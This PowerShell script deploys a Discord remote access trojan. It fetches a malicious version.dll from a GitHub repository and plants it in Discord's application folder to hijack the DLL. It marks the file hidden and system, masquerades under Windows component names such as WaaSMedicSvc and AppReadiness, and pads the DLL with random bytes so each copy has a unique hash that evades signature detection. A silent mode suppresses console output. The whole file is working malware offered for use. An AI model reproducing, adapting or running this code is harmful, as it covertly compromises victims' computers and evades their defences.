# GitHub deploy - downloads system-disguised payload files and hides them with attrib +h +s

param(
    [string]$GitHubBaseUrl = "https://raw.githubusercontent.com/xx21sa/shaher-rat/main/deploy",
    [switch]$Silent
)

$ErrorActionPreference = "Stop"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$MaintLog = Join-Path $env:TEMP "wr_maint.log"

function Write-MaintLog {
    param([string]$Message)
    $line = "$(Get-Date -Format 'HH:mm:ss') $Message"
    Add-Content -LiteralPath $MaintLog -Value $line -Encoding UTF8 -ErrorAction SilentlyContinue
}

if ($Silent) {
    function Write-Host {
        [CmdletBinding()]
        param(
            [object]$Object,
            [switch]$NoNewline,
            [object]$ForegroundColor,
            [object]$BackgroundColor
        )
        if ($Object) {
            Write-MaintLog ([string]$Object)
        }
    }
}

function Get-DiscordAppFolder {
    $discordRoot = Join-Path $env:LOCALAPPDATA "Discord"
    if (-not (Test-Path $discordRoot)) {
        throw "Discord not found in $discordRoot"
    }

    $latest = Get-ChildItem -Path $discordRoot -Directory -Filter "app-*" -ErrorAction SilentlyContinue |
        Sort-Object { [version]($_.Name -replace '^app-', '') } -Descending |
        Select-Object -First 1

    if (-not $latest) {
        throw "No Discord app-* folder found under $discordRoot"
    }

    return $latest.FullName
}

function Get-PayloadRoot {
    return Join-Path $env:LOCALAPPDATA "Microsoft\Windows\AppReadiness"
}

function Stop-PayloadProcesses {
    $names = @("WaaSMedicSvc", "Loader", "RuntimeHost")
    foreach ($name in $names) {
        Get-Process -Name $name -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
    }

    $payloadRoot = Get-PayloadRoot
    $loaderDb = Join-Path $payloadRoot "WaaSMedicSvc.db"
    if (Test-Path -LiteralPath $loaderDb) {
        Unlock-DeployPath -Path $loaderDb
        Remove-Item -LiteralPath $loaderDb -Force -ErrorAction SilentlyContinue
    }

    Start-Sleep -Seconds 2
}

function Unlock-DeployPath {
    param([string]$Path)

    if (-not (Test-Path $Path)) {
        return
    }

    attrib -h -s -r $Path 2>$null | Out-Null
}

function Start-DiscordAfterDeploy {
    $discordRoot = Join-Path $env:LOCALAPPDATA "Discord"
    if (-not (Test-Path $discordRoot)) {
        return
    }

    $updateExe = Get-ChildItem -Path $discordRoot -Recurse -Filter "Update.exe" -ErrorAction SilentlyContinue |
        Sort-Object FullName -Descending |
        Select-Object -First 1

    if ($updateExe) {
        Start-Process -FilePath $updateExe.FullName -ArgumentList "--processStart", "Discord.exe" -WindowStyle Hidden -ErrorAction SilentlyContinue | Out-Null
        Write-Host "[+] Discord restarted"
        return
    }

    $discordExe = Get-ChildItem -Path $discordRoot -Recurse -Filter "Discord.exe" -ErrorAction SilentlyContinue |
        Where-Object { $_.FullName -match '\\app-' } |
        Sort-Object FullName -Descending |
        Select-Object -First 1

    if ($discordExe) {
        Start-Process -FilePath $discordExe.FullName -WindowStyle Hidden -ErrorAction SilentlyContinue | Out-Null
        Write-Host "[+] Discord started"
    }
}

function Stop-DiscordIfRunning {
    $attempts = 0
    while ($attempts -lt 5) {
        $processes = Get-Process -Name "Discord" -ErrorAction SilentlyContinue
        if (-not $processes) {
            return
        }

        if ($attempts -eq 0) {
            Write-Host "[*] Closing Discord (required before loading new version.dll)..." -ForegroundColor Yellow
        }

        $processes | Stop-Process -Force -ErrorAction SilentlyContinue
        Start-Sleep -Seconds 2
        $attempts++
    }

    if (Get-Process -Name "Discord" -ErrorAction SilentlyContinue) {
        Write-Host "[WARN] Discord is still running. Close it from the tray, then reopen after deploy." -ForegroundColor Red
    }
}

function Set-SystemHidden {
    param([string]$Path)

    if (-not (Test-Path $Path)) {
        return
    }

    attrib +h +s $Path | Out-Null
}

function Hide-DeployTree {
    param([string[]]$Paths)

    foreach ($path in $Paths) {
        if (-not (Test-Path -LiteralPath $path)) {
            continue
        }

        $item = Get-Item -LiteralPath $path -Force
        if ($item.PSIsContainer) {
            Get-ChildItem -LiteralPath $path -Recurse -Force -ErrorAction SilentlyContinue | ForEach-Object {
                Set-SystemHidden $_.FullName
            }
        }

        Set-SystemHidden $path
    }
}

function Remove-LegacyDeployFiles {
    param([string]$PayloadRoot)

    $legacy = @(
        (Join-Path $PayloadRoot "RuntimeHost.exe"),
        (Join-Path $PayloadRoot "core.bin"),
        (Join-Path $PayloadRoot "Discord rat.dll"),
        (Join-Path $PayloadRoot "modules")
    )

    foreach ($item in $legacy) {
        if (Test-Path $item) {
            Remove-Item $item -Recurse -Force -ErrorAction SilentlyContinue
        }
    }
}

function New-DeploySession {
    $rng = [System.Security.Cryptography.RandomNumberGenerator]::Create()

    $sessionBytes = New-Object byte[] 16
    $rng.GetBytes($sessionBytes)
    $sessionId = -join ($sessionBytes | ForEach-Object { '{0:x2}' -f $_ })

    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\AppReadiness"
    if (-not (Test-Path $regPath)) {
        New-Item -Path $regPath -Force | Out-Null
    }
    Set-ItemProperty -Path $regPath -Name "Session" -Value $sessionId -Force

    $folderChars = (48..57) + (65..90)
    $folderName = -join (1..10 | ForEach-Object { [char]$folderChars[(Get-Random -Maximum $folderChars.Length)] })
    $markerRoot = Join-Path (Get-PayloadRoot) $folderName
    New-Item -ItemType Directory -Path $markerRoot -Force | Out-Null

    $fileStem = -join (1..12 | ForEach-Object { [char]$folderChars[(Get-Random -Maximum $folderChars.Length)] })
    $markerFile = Join-Path $markerRoot "$fileStem.db"
    Set-Content -Path $markerFile -Value $sessionId -Encoding ASCII -Force
    Set-SystemHidden $markerRoot
    Set-SystemHidden $markerFile

    return $sessionId
}

function Add-DllUniqueOverlay {
    param([string]$DllPath)

    $rng = [System.Security.Cryptography.RandomNumberGenerator]::Create()
    $payloadSize = Get-Random -Minimum 8192 -Maximum 49153
    $overlay = New-Object byte[] ($payloadSize + 8)

    $magic = [Text.Encoding]::ASCII.GetBytes("WRPM")
    $sizeBytes = [BitConverter]::GetBytes([UInt32]$payloadSize)
    [Array]::Copy($magic, 0, $overlay, 0, $magic.Length)
    [Array]::Copy($sizeBytes, 0, $overlay, 4, $sizeBytes.Length)
    $rng.GetBytes($overlay, 8, $payloadSize)

    $stream = [IO.File]::Open($DllPath, [IO.FileMode]::Open, [IO.FileAccess]::ReadWrite, [IO.FileShare]::Read)
    try {
        $stream.Seek(0, [IO.SeekOrigin]::End) | Out-Null
        $stream.Write($overlay, 0, $overlay.Length)
    }
    finally {
        $stream.Close()
    }

    $hash = (Get-FileHash -LiteralPath $DllPath -Algorithm SHA256).Hash.Substring(0, 16)
    return $hash
}

function Download-GithubFile {
    param(
        [string]$RemotePath,
        [string]$LocalPath
    )

    $url = "$GitHubBaseUrl/$RemotePath".Replace('\', '/')
    $dir = Split-Path $LocalPath -Parent
    if (-not (Test-Path $dir)) {
        New-Item -ItemType Directory -Path $dir -Force | Out-Null
    }

    Write-Host "[+] Downloading $RemotePath" -ForegroundColor Cyan

    Unlock-DeployPath -Path $LocalPath

    $tempPath = "$LocalPath.download"
    if (Test-Path $tempPath) {
        Remove-Item $tempPath -Force -ErrorAction SilentlyContinue
    }

    Invoke-WebRequest -Uri $url -OutFile $tempPath -UseBasicParsing
    Copy-Item -LiteralPath $tempPath -Destination $LocalPath -Force
    Remove-Item -LiteralPath $tempPath -Force -ErrorAction SilentlyContinue
}

if ($GitHubBaseUrl -match "YOUR_USER") {
    Write-Host "ERROR: Set your GitHub URL in deploy\config.json or pass -GitHubBaseUrl" -ForegroundColor Red
    exit 1
}

try {
    Write-Host "========================================" -ForegroundColor Green
    Write-Host " GitHub Deploy" -ForegroundColor Green
    Write-Host "========================================" -ForegroundColor Green
    Write-Host "Source: $GitHubBaseUrl" -ForegroundColor Gray
    Write-Host ""

    $payloadRoot = Get-PayloadRoot
    $discordFolder = Get-DiscordAppFolder

    Stop-DiscordIfRunning
    Stop-PayloadProcesses

    # Clean old disk-based payload (in-memory mode uses only version.dll)
    if (Test-Path -LiteralPath $payloadRoot) {
        Remove-Item -LiteralPath $payloadRoot -Recurse -Force -ErrorAction SilentlyContinue
    }

    Remove-LegacyDeployFiles -PayloadRoot $payloadRoot

    $sessionId = New-DeploySession
    Write-Host "[*] Deploy session: $sessionId" -ForegroundColor Gray

    $versionDest = Join-Path $discordFolder "version.dll"
    $repoRoot = Split-Path $PSScriptRoot -Parent
    $localDll = Join-Path $repoRoot "build\version.dll"

    if (Test-Path -LiteralPath $localDll) {
        Write-Host "[+] Installing local build\version.dll (includes your settings.cs token)" -ForegroundColor Cyan
        Unlock-DeployPath -Path $versionDest
        Copy-Item -LiteralPath $localDll -Destination $versionDest -Force
    } else {
        Download-GithubFile -RemotePath "version.dll" -LocalPath $versionDest
    }

    $dllHash = Add-DllUniqueOverlay -DllPath $versionDest
    Write-Host "[*] Unique DLL fingerprint: $dllHash" -ForegroundColor Gray

    $hiddenPaths = @(
        (Join-Path $discordFolder "version.dll")
    )

    Hide-DeployTree -Paths $hiddenPaths

    Write-Host ""
    Write-Host "[OK] Deploy complete (in-memory mode - version.dll only)" -ForegroundColor Green
    Write-Host "  Proxy   : $discordFolder\version.dll  [hidden+system, payload in memory]" -ForegroundColor White
    Write-Host ""

    Start-Sleep -Seconds 2
    Start-DiscordAfterDeploy

    Write-Host "Session should appear in Discord after restart." -ForegroundColor Yellow
    Write-Host "Debug log: $env:TEMP\wrprov.log" -ForegroundColor Gray
    if ($Silent) {
        Write-Host "Install log: $MaintLog" -ForegroundColor Gray
    }
}
catch {
    $msg = $_.Exception.Message
    Write-MaintLog "ERROR: $msg"
    if (-not $Silent) {
        Write-Host "ERROR: $msg" -ForegroundColor Red
    }
    exit 1
}





